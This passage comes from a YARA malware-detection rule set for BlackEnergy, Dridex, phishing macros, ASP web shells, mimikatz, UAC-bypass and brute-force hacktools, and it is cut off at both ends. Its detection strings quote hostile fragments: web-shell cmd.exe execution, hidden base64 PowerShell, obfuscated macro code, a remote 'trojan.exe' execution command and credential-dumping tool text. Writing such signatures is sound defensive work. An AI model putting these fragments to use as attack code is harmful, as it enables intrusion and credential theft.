reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
date = "2016-01-03"
score = 50
hash = "0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd"
strings:
$s1 = "Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html" fullword ascii
$s2 = "Badly formatted command= authorized_keys option" fullword ascii
$s3 = "This Dropbear program does not support '%s' %s algorithm" fullword ascii
$s4 = "/etc/dropbear/dropbear_dss_host_key" fullword ascii
$s5 = "/etc/dropbear/dropbear_rsa_host_key" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}
rule SSC_BlackEnergy_Driver_AMDIDE
{
meta:
description = "Auto-generated rule - from files 32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614, 3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2, 90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c, 97be6b2cec90f655ef11ed9feef5b9ef057fd8db7dd11712ddb3702ed7c7bda1"
author = "Florian Roth"
reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
date = "2016-01-04"
super_rule = 1
hash1 = "32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614"
hash2 = "3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2"
hash3 = "90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c"
hash4 = "97be6b2cec90f655ef11ed9feef5b9ef057fd8db7dd11712ddb3702ed7c7bda1"
hash5 = "5111de45210751c8e40441f16760bf59856ba798ba99e3c9532a104752bf7bcc"
hash6 = "cbc4b0aaa30b967a6e29df452c5d7c2a16577cede54d6d705ca1f095bd6d4988"
hash7 = "1ce0dfe1a6663756a32c69f7494ad082d293d32fe656d7908fb445283ab5fa68"
strings:
$s1 = " AMD IDE driver" fullword wide
$s2 = "SessionEnv" fullword wide
$s3 = "\\DosDevices\\{C9059FFF-1C49-4445-83E8-" wide
$s4 = "\\Device\\{C9059FFF-1C49-4445-83E8-" wide
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_BlackEnergy_KillDisk_2
{
meta:
description = "Detects KillDisk malware from BlackEnergy"
author = "Florian Roth"
reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
date = "2016-01-03"
score = 80
super_rule = 1
hash1 = "11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80"
hash2 = "5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6"
hash3 = "f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95"
strings:
$s0 = "%c:\\~tmp%08X.tmp" fullword ascii
$s1 = "%s%08X.tmp" fullword ascii
$s2 = ".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf" fullword wide
$s3 = "%ls_%ls_%ls_%d.~tmp" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 500KB and 3 of them
}
rule SSC_Contains_hidden_PE_File_inside_a_sequence_of_numbers : maldoc
{
meta:
author = "Martin Willing (https://evild3ad.com)"
description = "Detect a hidden PE file inside a sequence of numbers (comma separated)"
reference = "http://blog.didierstevens.com/2016/01/07/blackenergy-xls-dropper/"
reference = "http://www.welivesecurity.com/2016/01/04/blackenergy-trojan-strikes-again-attacks-ukrainian-electric-power-industry/"
date = "2016-01-09"
filetype = "decompressed VBA macro code"
strings:
$a = "= Array(" // Array of bytes
$b = "77, 90," // MZ
$c = "33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46," // !This program cannot be run in DOS mode.
condition:
all of them
}
rule SSC_Dridex_Trojan_XML : maldoc {
meta:
description = "Dridex Malware in XML Document"
author = "Florian Roth @4nc4p"
reference = "https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503"
date = "2015/03/08"
hash1 = "88d98e18ed996986d26ce4149ae9b2faee0bc082"
hash2 = "3b2d59adadf5ff10829bb5c27961b22611676395"
hash3 = "e528671b1b32b3fa2134a088bfab1ba46b468514"
hash4 = "981369cd53c022b434ee6d380aa9884459b63350"
hash5 = "96e1e7383457293a9b8f2c75270b58da0e630bea"
strings:
// can be ascii or wide formatted - therefore no restriction
$c_xml      = "<?xml version="
$c_word     = "<?mso-application progid=\"Word.Document\"?>"
$c_macro    = "w:macrosPresent=\"yes\""
$c_binary   = "<w:binData w:name="
$c_0_chars  = "<o:Characters>0</o:Characters>"
$c_1_line   = "<o:Lines>1</o:Lines>"
condition:
all of ($c*)
}
rule SSC_PHISH_02Dez2015_attach_P_ORD_C_10156_124658 {
meta:
description = "Phishing Wave - file P-ORD-C-10156-124658.xls"
author = "Florian Roth"
reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
date = "2015-12-02"
hash = "bc252ede5302240c2fef8bc0291ad5a227906b4e70929a737792e935a5fee209"
strings:
$s1 = "Execute" ascii
$s2 = "Process WriteParameterFiles" fullword ascii
$s3 = "WScript.Shell" fullword ascii
$s4 = "STOCKMASTER" fullword ascii
$s5 = "InsertEmailFax" ascii
condition:
uint16(0) == 0xcfd0 and filesize < 200KB and all of them
}
rule SSC_PHISH_02Dez2015_dropped_p0o6543f {
meta:
description = "Phishing Wave - file p0o6543f.exe"
author = "Florian Roth"
reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
date = "2015-12-02"
hash = "db788d6d3a8ed1a6dc9626852587f475e7671e12fa9c9faa73b7277886f1e210"
strings:
$s1 = "netsh.exe" fullword wide
$s2 = "routemon.exe" fullword wide
$s3 = "script=" fullword wide /* Goodware String - occured 4 times */
$s4 = "disconnect" fullword wide /* Goodware String - occured 14 times */
$s5 = "GetClusterResourceTypeKey" fullword ascii /* Goodware String - occured 17 times */
$s6 = "QueryInformationJobObject" fullword ascii /* Goodware String - occured 34 times */
$s7 = "interface" fullword wide /* Goodware String - occured 52 times */
$s8 = "connect" fullword wide /* Goodware String - occured 61 times */
$s9 = "FreeConsole" fullword ascii /* Goodware String - occured 91 times */
condition:
uint16(0) == 0x5a4d and filesize < 250KB and all of them
}
rule SSC_APT_OLE_JSRat : maldoc APT
{
meta:
author = "Rahul Mohandas"
Date = "2015-06-16"
Description = "Targeted attack using Excel/word documents"
strings:
$header = {D0 CF 11 E0 A1 B1 1A E1}
$key1 = "AAAAAAAAAA"
$key2 = "Base64Str" nocase
$key3 = "DeleteFile" nocase
$key4 = "Scripting.FileSystemObject" nocase
condition:
$header at 0 and (all of ($key*) )
}
rule SSC_FE_LEGALSTRIKE_MACRO {
meta:version=".1"
filetype="MACRO"
author="Ian.Ahl@fireeye.com @TekDefense"
date="2017-06-02"
description="This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7."
strings:
// OBSFUCATION
$ob1 = "ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)" ascii wide
$ob2 = "ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)" ascii wide
$ob3 = "ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)" ascii wide
$ob4 = "ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)" ascii wide
$ob5 = "ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)" ascii wide
$ob6 = "ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)" ascii wide
$ob7 = "ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)" ascii wide
$ob8 = "ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)" ascii wide
$obreg2 = /(Chrw\(\d{1,3}\)\s&\s){7}/
// wscript
$wsobj1 = "Set Obj = CreateObject(\"WScript.Shell\")" ascii wide
$wsobj2 = "Obj.Run " ascii wide
condition:
(
(
(uint16(0) != 0x5A4D)
)
and
(
all of ($wsobj*) and 3 of ($ob*)
or
all of ($wsobj*) and all of ($obreg*)
)
)
}
rule SSC_FE_LEGALSTRIKE_RTF {
meta:
version=".1"
filetype="MACRO"
author="joshua.kim@FireEye.com"
date="2017-06-02"
description="Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom"
strings:
$header = "{\\rt"
$lnkinfo = "4c0069006e006b0049006e0066006f"
$encoded1 = "4f4c45324c696e6b"
$encoded2 = "52006f006f007400200045006e007400720079"
$encoded3 = "4f0062006a0049006e0066006f"
$encoded4 = "4f006c0065"
$http1 = "68{"
$http2 = "74{"
$http3 = "07{"
// 2bunny.com
$domain1 = "32{\\"
$domain2 = "62{\\"
$domain3 = "75{\\"
$domain4 = "6e{\\"
$domain5 = "79{\\"
$domain6 = "2e{\\"
$domain7 = "63{\\"
$domain8 = "6f{\\"
$domain9 = "6d{\\"
$datastore = "\\*\\datastore"
condition:
$header at 0 and all of them
}
rule SSC_FE_LEGALSTRIKE_MACRO_2 {
meta:version=".1"
filetype="MACRO"
author="Ian.Ahl@fireeye.com @TekDefense"
date="2017-06-02"
description="This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4."
strings:
// Setting the environment
$env1 = "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")" ascii wide
$env2 = "windir = Environ(\"windir\")" ascii wide
$env3 = "windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"" ascii wide
// powershell command fragments
$ps1 = "-NoP" ascii wide
$ps2 = "-NonI" ascii wide
$ps3 = "-W Hidden" ascii wide
$ps4 = "-Command" ascii wide
$ps5 = "New-Object IO.StreamReader" ascii wide
$ps6 = "IO.Compression.DeflateStream" ascii wide
$ps7 = "IO.MemoryStream" ascii wide
$ps8 = ",$([Convert]::FromBase64String" ascii wide
$ps9 = "ReadToEnd();" ascii wide
condition:
(
(
(uint16(0) != 0x5A4D)
)
and
(
all of ($env*) and 6 of ($ps*)
)
)
}
rule SSC_aspfile1 {
meta:
description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
strings:
$s0 = "' -- check for a command that we have posted -- '" fullword ascii
$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
condition:
3 of them
}
rule SSC_Ammyy_Admin_AA_v3 {
meta:
description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
author = "Florian Roth"
reference = "http://goo.gl/gkAg2E"
date = "2014/12/22"
score = 55
hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
strings:
$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
$x5 = "Please enter password for accessing remote computer" fullword ascii
$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
condition:
2 of ($x*) or all of ($s*)
}
rule SSC_stealth_Stealth {
meta:
description = "Auto-generated rule on file Stealth.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
strings:
$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
$s6 = "This tool may be used only by system administrators. I am not responsible for "
condition:
all of them
}
rule SSC_DUBrute_DUBrute {
meta:
description = "Chinese Hacktool Set - file DUBrute.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65"
strings:
$s1 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
$s2 = "IP - 0; Login - 0; Password - 0; Combination - 0" fullword ascii
$s3 = "Create %d IP@Loginl;Password" fullword ascii
$s4 = "UBrute.com" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1020KB and all of them
}
rule SSC_CN_Toolset_LScanPortss_2 {
meta:
description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
author = "Florian Roth"
reference = "http://qiannao.com/ls/905300366/33834c0c/"
reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
date = "2015/03/30"
score = 70
hash = "4631ec57756466072d83d49fbc14105e230631a0"
strings:
$s1 = "LScanPort.EXE" fullword wide
$s3 = "www.honker8.com" fullword wide
$s4 = "DefaultPort.lst" fullword ascii
$s5 = "Scan over.Used %dms!" fullword ascii
$s6 = "www.hf110.com" fullword wide
$s15 = "LScanPort Microsoft " fullword wide
$s18 = "L-ScanPort2.0 CooFly" fullword wide
condition:
4 of them
}
rule SSC_Pc_pc2015 {
meta:
description = "Chinese Hacktool Set - file pc2015.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "de4f098611ac9eece91b079050b2d0b23afe0bcb"
strings:
$s0 = "\\svchost.exe" fullword ascii
$s1 = "LON\\OD\\O-\\O)\\O%\\O!\\O=\\O9\\O5\\O1\\O" fullword ascii
$s8 = "%s%08x.001" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 309KB and all of them
}
rule SSC_StealthWasp_s_Basic_PortScanner_v1_2 {
meta:
description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "7c0f2cab134534cd35964fe4c6a1ff00"
strings:
$s1 = "Basic PortScanner"
$s6 = "Now scanning port:"
condition:
all of them
}
rule SSC_hydra_7_3_hydra {
meta:
description = "Chinese Hacktool Set - file hydra.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "2f82b8bf1159e43427880d70bcd116dc9e8026ad"
strings:
$s1 = "[ATTEMPT-ERROR] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii
$s2 = "(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE" ascii
$s3 = "cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com" fullword ascii
$s4 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
$s5 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 700KB and 1 of them
}
rule SSC_Hacktools_CN_GOGOGO_Bat {
meta:
description = "Disclosed hacktool set - file GOGOGO.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
strings:
$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
$s6 = "del /f tcpip.sys" fullword ascii
$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
$s10 = "call scan.bat" fullword ascii
$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
$s18 = "sc config LmHosts start= auto" fullword ascii
$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
condition:
3 of them
}
rule SSC_CN_Tools_VNCLink {
meta:
description = "Chinese Hacktool Set - file VNCLink.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "cafb531822cbc0cfebbea864489eebba48081aa1"
strings:
$s1 = "C:\\temp\\vncviewer4.log" fullword ascii
$s2 = "[BL4CK] Patched by redsand || http://blacksecurity.org" fullword ascii
$s3 = "fake release extendedVkey 0x%x, keysym 0x%x" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 580KB and 2 of them
}
rule SSC__Project1_Generate_rejoice {
meta:
description = "Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
super_rule = 1
hash0 = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
hash1 = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
hash2 = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
strings:
$s1 = "sfUserAppDataRoaming" fullword ascii
$s2 = "$TRzFrameControllerPropertyConnection" fullword ascii
$s3 = "delphi32.exe" fullword ascii
$s4 = "hkeyCurrentUser" fullword ascii
$s5 = "%s is not a valid IP address." fullword wide
$s6 = "Citadel hooking error" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}
rule SSC_sig_238_webget {
meta:
description = "Disclosed hacktool set (old stuff) - file webget.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
strings:
$s0 = "Packed by exe32pack" ascii
$s1 = "GET A HTTP/1.0" fullword ascii
$s2 = " error " fullword ascii
$s13 = "Downloa" ascii
condition:
all of them
}
rule SSC_CN_Tools_Shiell {
meta:
description = "Chinese Hacktool Set - file Shiell.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b432d80c37abe354d344b949c8730929d8f9817a"
strings:
$s1 = "C:\\Users\\Tong\\Documents\\Visual Studio 2012\\Projects\\Shift shell" ascii
$s2 = "C:\\Windows\\System32\\Shiell.exe" fullword wide
$s3 = "Shift shell.exe" fullword wide
$s4 = "\" /v debugger /t REG_SZ /d \"" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1500KB and 2 of them
}
rule SSC_BypassUacDll_6 {
meta:
description = "Auto-generated rule - file BypassUacDll.aps"
author = "yarGen Yara Rule Generator"
hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
strings:
$s3 = "BypassUacDLL.dll" fullword wide
$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
condition:
all of them
}
rule SSC_kiwi_tools {
meta:
description = "Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
super_rule = 1
hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
hash5 = "7addce4434670927c4efaa560524680ba2871d17"
hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
hash7 = "b5c93489a1b62181594d0fb08cc510d947353bc8"
hash8 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
hash9 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
hash10 = "febadc01a64a071816eac61a85418711debaf233"
hash11 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
hash12 = "56a61c808b311e2225849d195bbeb69733efe49a"
hash13 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
hash14 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
hash15 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
hash16 = "20facf1fa2d87cccf177403ca1a7852128a9a0ab"
hash17 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
strings:
$s1 = "http://blog.gentilkiwi.com/mimikatz" ascii
$s2 = "Benjamin Delpy" fullword ascii
$s3 = "GlobalSign" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_Hacktools_CN_Panda_445 {
meta:
description = "Disclosed hacktool set - file 445.rar"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
strings:
$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
$s1 = "445\\nc.exe" fullword ascii
$s2 = "445\\s.exe" fullword ascii
$s3 = "cs.exe %1" fullword ascii
$s4 = "445\\cs.exe" fullword ascii
$s5 = "445\\ip.txt" fullword ascii
$s6 = "445\\cmd.bat" fullword ascii
$s9 = "@echo off" fullword ascii
condition:
all of them
}
rule SSC_XYZCmd_zip_Folder_XYZCmd {
meta:
description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
strings:
$s0 = "Executes Command Remotely" fullword wide
$s2 = "XYZCmd.exe" fullword wide
$s6 = "No Client Software" fullword wide
$s19 = "XYZCmd V1.0 For NT S" fullword ascii
condition:
all of them
}
rule SSC_WindowsCredentialEditor
{
meta:
description = "Windows Credential Editor" threat_level = 10 score = 90
strings:
$a = "extract the TGT session key"
$b = "Windows Credentials Editor"
condition:
$a or $b
}
rule SSC_XYZCmd_zip_Folder_Readme {
meta:
description = "Disclosed hacktool set (old stuff) - file Readme.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
strings:
$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
$s20 = "XYZCmd V1.0" fullword ascii
condition:
all of them
}
rule SSC_BypassUac_9 {
meta:
description = "Auto-generated rule - file BypassUac.zip"
author = "yarGen Yara Rule Generator"
hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
strings:
$s0 = "/x86/BypassUac.exe" fullword ascii
$s1 = "/x64/BypassUac.exe" fullword ascii
$s2 = "/x86/BypassUacDll.dll" fullword ascii
$s3 = "/x64/BypassUacDll.dll" fullword ascii
$s15 = "BypassUac" fullword ascii
condition:
all of them
}
rule SSC_aspbackdoor_regdll {
meta:
description = "Disclosed hacktool set (old stuff) - file regdll.asp"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
strings:
$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
$s5 = "Public Property Get oFS()" fullword ascii
condition:
all of them
}
rule SSC_hkmjjiis6 {
meta:
description = "Chinese Hacktool Set - file hkmjjiis6.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "4cbc6344c6712fa819683a4bd7b53f78ea4047d7"
strings:
$s1 = "comspec" fullword ascii
$s2 = "user32.dlly" ascii
$s3 = "runtime error" ascii
$s4 = "WinSta0\\Defau" ascii
$s5 = "AppIDFlags" fullword ascii
$s6 = "GetLag" fullword ascii
$s7 = "* FROM IIsWebInfo" ascii
$s8 = "wmiprvse.exe" ascii
$s9 = "LookupAcc" ascii
condition:
uint16(0) == 0x5a4d and filesize < 70KB and all of them
}
rule SSC_CN_Hacktool_S_EXE_Portscanner {
meta:
description = "Detects a chinese Portscanner named s.exe"
author = "Florian Roth"
score = 70
date = "12.10.2014"
strings:
$s0 = "\\Result.txt" fullword ascii
$s1 = "By:ZT QQ:376789051" fullword ascii
$s2 = "(http://www.eyuyan.com)" fullword wide
condition:
all of them
}
rule SSC_KiwiTaskmgr_2 {
meta:
description = "Chinese Hacktool Set - file KiwiTaskmgr.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
strings:
$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
$s2 = "Kiwi Taskmgr no-gpo" fullword wide
$s3 = "KiwiAndTaskMgr" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_VUBrute_config {
meta:
description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
author = "Florian Roth"
date = "22.11.14"
score = 70
reference = "http://goo.gl/xiIphp"
hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
strings:
$s2 = "Restore=1" fullword ascii
$s6 = "Thread=" ascii
$s7 = "Running=1" fullword ascii
$s8 = "CheckCombination=" fullword ascii
$s10 = "AutoSave=1.000000" fullword ascii
$s12 = "TryConnect=" ascii
$s13 = "Tray=" ascii
condition:
all of them
}
rule SSC_VSSown_VBS {
meta:
description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
author = "Florian Roth"
date = "2015-10-01"
score = 75
strings:
$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
$s1 = "Select * From Win32_ShadowCopy" ascii
$s2 = "cmd /C mklink /D " ascii
$s3 = "ClientAccessible" ascii
$s4 = "WScript.Shell" ascii
$s5 = "Win32_Process" ascii
condition:
all of them
}
rule SSC_whosthere_alt : Toolkit {
meta:
description = "Auto-generated rule - file whosthere-alt.exe"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de"
strings:
$s0 = "WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */
$s1 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
$s2 = "dump output to a file, -o filename" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
$s3 = "This tool lists the active LSA logon sessions with NTLM credentials." fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */
$s4 = "Error: pth.dll is not in the current directory!." fullword ascii /* score: '24.00' */
$s5 = "the output format is: username:domain:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s6 = ".\\pth.dll" fullword ascii /* score: '16.00' */
$s7 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
condition:
uint16(0) == 0x5a4d and filesize < 280KB and 2 of them
}
rule SSC_aspbackdoor_EDIT {
meta:
description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
strings:
$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
$s3 = "response.write \"<a href='index.asp'>" fullword ascii
$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
